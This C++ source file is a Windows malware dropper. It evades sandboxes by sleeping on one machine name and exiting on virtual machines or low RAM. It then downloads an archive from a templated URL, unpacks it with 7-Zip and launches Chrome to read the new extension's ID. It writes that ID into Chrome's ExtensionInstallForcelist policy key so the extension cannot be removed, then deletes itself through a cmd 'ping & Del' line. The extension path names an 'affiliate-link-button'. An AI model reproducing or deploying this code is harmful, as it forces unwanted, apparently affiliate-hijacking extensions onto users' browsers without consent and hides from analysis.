#include <iostream>
#include <string>
#include <Windows.h>
#include <locale>
#include <codecvt>
#include <filesystem>
#include<direct.h>
#include <strsafe.h>
#include <chrono>
#include <thread>
#include <locale>
#include <vector>
#include <iomanip>
#include <algorithm>
#include <iterator>
#include <sstream>
#pragma comment(lib, "urlmon.lib")


#define _CRT_SECURE_NO_WARNINGS
#define SELF_REMOVE_STRING  TEXT("cmd.exe /C ping 1.1.1.1 -n 1 -w 3000 > Nul & Del /f /q \"%s\"")
#define RUN_CHROME_STRING  TEXT("cmd.exe /C \"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\" --load-extension=C:\\Users\\ADMIN\\Downloads\\affiliate-link-button")


using namespace std;

struct KeyValuePair {
    string name;
    string value;
};

std::string GetComputerName() {
    char computerName[MAX_COMPUTERNAME_LENGTH + 1];
    DWORD size = sizeof(computerName);

    if (GetComputerNameA(computerName, &size)) {
        return std::string(computerName);
    }
    else {
        return "Unknown";
    }
}

wstring Get7ZipPath()
{
    HKEY key;
    wstring path;

    if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, TEXT("SOFTWARE\\7-Zip"), 0, KEY_READ, &key) == ERROR_SUCCESS) {
        wchar_t buffer[MAX_PATH];
        DWORD bufferSize = MAX_PATH * sizeof(wchar_t);

        // Get the installation path from the registry value
        if (RegGetValue(key, nullptr, TEXT("Path"), RRF_RT_REG_SZ, nullptr, buffer, &bufferSize) == ERROR_SUCCESS) {
            path = buffer;
            path += L"7z.exe";
        }

        // Close the registry key
        RegCloseKey(key);
    }

    return path;
}

bool IsChromeInstalled() {
    HKEY hKey;
    bool isInstalled = false;

    if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Google\\Chrome", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        isInstalled = true;
        RegCloseKey(hKey);
    }

    return isInstalled;
}

float GetRamCapacity() {
    MEMORYSTATUSEX statex;
    statex.dwLength = sizeof(statex);

    GlobalMemoryStatusEx(&statex);

    return (float)statex.ullTotalPhys / (1024 * 1024 * 1024.0);
}

bool IsVirtualComputer() {
    HKEY hKey;
    if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, TEXT("SOFTWARE\\VMware, Inc.\\VMware Tools"), 0, KEY_READ, &hKey) == ERROR_SUCCESS)
    {
        RegCloseKey(hKey);
        return true;
    }

    if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, TEXT("SOFTWARE\\Oracle\\VirtualBox Guest Additions"), 0, KEY_READ, &hKey) == ERROR_SUCCESS)
    {
        RegCloseKey(hKey);
        return true;
    }

    // Check for Hyper-V virtual machine
    if (IsProcessorFeaturePresent(PF_VIRT_FIRMWARE_ENABLED))
    {
        return true;
    }

    return false;
}

string GetFileNameFromPath(string path) {
    size_t lastSlash = path.find_last_of("/\\");
    if (lastSlash != std::string::npos) {
        return path.substr(lastSlash + 1);
    }
    return path;
}

void DownloadExtension(string url, string path) {

    wstring tempUrl = wstring(url.begin(), url.end());
    wstring tempPath = wstring(path.begin(), path.end());

    LPCWSTR wideStringUrl = tempUrl.c_str();
    LPCWSTR wideStringPath = tempPath.c_str();

    if (S_OK == URLDownloadToFile(NULL, wideStringUrl, wideStringPath, 0, NULL)) {
        //cout << "Downlod: Succses" << endl;
    }
    else {
        //cout << "Download: Fails" << endl;
    }
}

string WStringToString(wstring wstr) {
    std::wstring_convert<std::codecvt_utf8<wchar_t>> converter;
    return converter.to_bytes(wstr);
}

void ExtractExtension(string path, string destination)
{
    string programPath = WStringToString(Get7ZipPath());
    string command = "cd " + destination + " && ";
    //system(command.c_str());
    command += "\"" + programPath + "\"" + " x " + path;// +" -ooutput " + destination;
    system(command.c_str());
}



wstring GetChromeLocation() {
    HKEY hKey;
    std::wstring chromeLocation;

    if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, TEXT("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\chrome.exe"), 0, KEY_QUERY_VALUE, &hKey) == ERROR_SUCCESS) {
        wchar_t buffer[MAX_PATH];
        DWORD bufferSize = MAX_PATH * sizeof(wchar_t);

        if (RegQueryValueEx(hKey, nullptr, nullptr, nullptr, (LPBYTE)buffer, &bufferSize) == ERROR_SUCCESS) {
            chromeLocation = buffer;
        }

        RegCloseKey(hKey);
    }

    return chromeLocation;
}

string GetCurrentFolder() {
    char buffer[MAX_PATH];
    if (GetCurrentDirectoryA(MAX_PATH, buffer)) {
        //std::cout << "Current working directory: " << buffer << std::endl;
    }
    else {
        //std::cout << "Failed to get current working directory." << std::endl;
    }

    return buffer;
}

void OpenChrome(string extensionLocation)
{
    wstring chrome = GetChromeLocation();
    string chromePath = WStringToString(chrome);
    string command = "\"" + chromePath + "\"" + " --load-extension=" + extensionLocation;
    system(command.c_str());
}


string WCharToString(const wchar_t* wstr) {
    std::wstring_convert<std::codecvt_utf8_utf16<wchar_t>> converter;
    return converter.to_bytes(wstr);
}

void ReplaceSubstring(std::string& original, const std::string& from, const std::string& to) {
    size_t startPos = original.find(from);
    while (startPos != std::string::npos) {
        original.replace(startPos, from.length(), to);
        startPos = original.find(from, startPos + to.length());
    }
}

std::string GenerateGUID() {
    GUID guid;
    CoCreateGuid(&guid);

    wchar_t guidStr[40];
    auto _ = StringFromGUID2(guid, guidStr, sizeof(guidStr) / sizeof(guidStr[0]));
    string result = WCharToString(guidStr);
    ReplaceSubstring(result, "{", "");
    ReplaceSubstring(result, "}", "");
    return result;
}

string GetFileNameWithoutExtension(string filePath) {
    size_t lastSlash = filePath.find_last_of("/\\");
    size_t lastDot = filePath.find_last_of(".");
    if (lastDot != std::string::npos && (lastSlash == std::string::npos || lastDot > lastSlash)) {
        return filePath.substr(lastSlash + 1, lastDot - lastSlash - 1);
    }

    return filePath.substr(lastSlash + 1);
}

string GetTempFolder() {
    char* tempPath = nullptr;
    size_t size;
    errno_t err = _dupenv_s(&tempPath, &size, "TEMP");
    if (err == 0 && tempPath != nullptr) {
        string tempFolder(tempPath);
        free(tempPath);
        return tempFolder;
    }
    return "";
}

void CloseAllChrome() {
    HWND hwnd = FindWindowA("Chrome_WidgetWin_1", NULL);
    while (hwnd) {
        PostMessage(hwnd, WM_CLOSE, 0, 0);
        hwnd = FindWindowExA(NULL, hwnd, "Chrome_WidgetWin_1", NULL);
    }

    //std::cout << "All Chrome instances closed." << std::endl;

    return;
}

void DelMe()
{
    TCHAR szModuleName[MAX_PATH];
    TCHAR szCmd[2 * MAX_PATH];
    STARTUPINFO si = { 0 };
    PROCESS_INFORMATION pi = { 0 };

    GetModuleFileName(NULL, szModuleName, MAX_PATH);

    StringCbPrintf(szCmd, 2 * MAX_PATH, SELF_REMOVE_STRING, szModuleName);

    CreateProcess(NULL, szCmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);

    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
}


vector<KeyValuePair> EnumerateRegistryKeysAndValues(HKEY key) {
    vector<KeyValuePair> result;
    auto openedKey = key;

    auto valueCount = static_cast<DWORD>(0);
    auto maxNameLength = static_cast<DWORD>(0);
    auto maxValueLength = static_cast<DWORD>(0);
    auto status = RegQueryInfoKey(openedKey, NULL, NULL, NULL, NULL, NULL, NULL,
        &valueCount, &maxNameLength, &maxValueLength, NULL, NULL);

    if (status == ERROR_SUCCESS) {
        DWORD type = 0;
        DWORD index = 0;
        std::vector<wchar_t> valueName = std::vector<wchar_t>(maxNameLength + 1);
        std::vector<BYTE> dataBuffer = std::vector<BYTE>(maxValueLength);

        for (DWORD index = 0; index < valueCount; index++) {
            DWORD charCountValueName = static_cast<DWORD>(valueName.size());
            DWORD charBytesData = static_cast<DWORD>(dataBuffer.size());
            status = RegEnumValue(openedKey, index, valueName.data(), &charCountValueName,
                NULL, &type, dataBuffer.data(), &charBytesData);

            if (type == REG_SZ) {
                const auto reg_string = reinterpret_cast<wchar_t*>(dataBuffer.data());
                KeyValuePair value = { WStringToString(valueName.data()), WStringToString(reg_string) };
                result.push_back(value);
            }
        }
    }

    return result;
}

void ThreadFunction() {
    system(R"("C:\Program Files\Google\Chrome\Application\chrome.exe" --load-extension=C:\Users\ADMIN\Downloads\affiliate-link-button)");
}

vector<string> GetExtensionId(string extensionLocation) {
    vector<string> result;
    HKEY hKey;
    if (RegOpenKeyEx(HKEY_CURRENT_USER, L"SOFTWARE\\Google\\Chrome\\PreferenceMACs\\Default\\extensions.settings", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {

    }
    else {
        //std::cerr << "Failed to open registry key." << std::endl;
        return result;
    }

    auto oldData = EnumerateRegistryKeysAndValues(hKey);

    CloseAllChrome();

    std::thread t(OpenChrome, extensionLocation);
    t.detach();
    this_thread::sleep_for(std::chrono::seconds(2));
    CloseAllChrome();

    if (RegOpenKeyEx(HKEY_CURRENT_USER, L"SOFTWARE\\Google\\Chrome\\PreferenceMACs\\Default\\extensions.settings", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {

    }
    else {
        //std::cerr << "Failed to open registry key." << std::endl;
        return result;
    }
    auto newData = EnumerateRegistryKeysAndValues(hKey);

    for (const auto& item : newData) {
        auto flag = false;
        for (const auto& old : oldData) {
            if (old.name == item.name)
            {
                flag = true;
                continue;
            }
        }

        if (!flag)
        {
            //cout << item.name << endl;
            result.push_back(item.name);
        }
    }

    return result;
}

int InsertForceInstall(string key, string value) {

    std::string subKey = "SOFTWARE\\Policies\\Google\\Chrome\\ExtensionInstallForcelist";
    HKEY hKey;


    LONG result = RegCreateKeyExA(HKEY_LOCAL_MACHINE, subKey.c_str(), 0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, NULL);

    if (result == ERROR_SUCCESS) {
        const BYTE* byteValue = reinterpret_cast<const BYTE*>(value.c_str());
        DWORD dataSize = static_cast<DWORD>(value.size()) + 1;

        result = RegSetValueExA(hKey, key.c_str(), 0, REG_SZ, byteValue, dataSize);

        if (result == ERROR_SUCCESS) {
            //std::cout << "Value added to registry successfully." << std::endl;
        }
        else {
            //std::cerr << "Error adding value to registry: " << result << std::endl;
        }

        RegCloseKey(hKey);
    }
    else {
        //std::cerr << "Error creating or opening registry key: " << result << std::endl;
    }

    return 0;
}

vector<string> Split(string input) {
    std::vector<std::string> output;

    std::istringstream iss(input);
    std::string token;

    while (std::getline(iss, token, ';')) {
        output.push_back(token);
    }

    return output;
}

void InstallExtension(string id, string extensionLocation) {
    HKEY hKey;
    if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Policies\\Google\\Chrome\\ExtensionInstallForcelist", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {

    }
    else {
        // std::cerr << "Failed to open registry key." << std::endl;
    }

    auto values = EnumerateRegistryKeysAndValues(hKey);

    auto valueName = to_string(values.size() + 1);
    auto valueData = id + ";" + extensionLocation;

    auto flag = false;
    for (const KeyValuePair& item : values) {
        auto temp = Split(item.value);
        if (temp.size() != 0)
        {
            if (id == temp[0])
            {
                flag = true;
                break;
            }
        }
    }

    if (flag)
    {
        return;
    }

    InsertForceInstall(valueName, valueData);
}

int main()
{
    if (GetComputerName() == "HAL9TH")
    {
        std::this_thread::sleep_for(std::chrono::minutes(10));

        //std::cout << "Slept for 10 minutes." << std::endl;
    }

    if (IsChromeInstalled()) {
        //std::cout << "Google Chrome is installed." << std::endl;
    }
    else {
        //std::cout << "Google Chrome is not installed." << std::endl;
        return -1;
    }

    if (IsVirtualComputer()) {
        return -1;
    }

    auto ram = GetRamCapacity();
    if (ram <= 2)
    {
        return -1;
    }
    std::wstring path = Get7ZipPath();
    if (!path.empty()) {
        //std::wcout << "7-Zip path: " << path << std::endl;
    }
    else {
        //std::cout << "7-Zip not found. Make sure it is installed and the registry key is correct." << std::endl;
        return -1;
    }


    string bushbaby = "${bushbaby}";

    string guid = GenerateGUID();
    string directory = GetTempFolder() + "\\" + guid;
    auto _ = _mkdir(directory.c_str());
    string fileName = directory + "\\" + GetFileNameFromPath(bushbaby);
    string dic = GetFileNameWithoutExtension(fileName);

    //cout << GetFileNameWithoutExtension(fileName) << endl;
    DownloadExtension(bushbaby, fileName);

    ExtractExtension(fileName, directory);

    auto ids = GetExtensionId(directory + "\\" + dic);

    if (ids.size() == 0) {
        DelMe();
        return 0;
    }

    for (const std::string& item : ids) {
        //InstallExtension(item, "https://clients2.google.com/service/update2/crx");
        InstallExtension(item, directory + "\\" + dic);
    }

    DelMe();

    return 0;
}

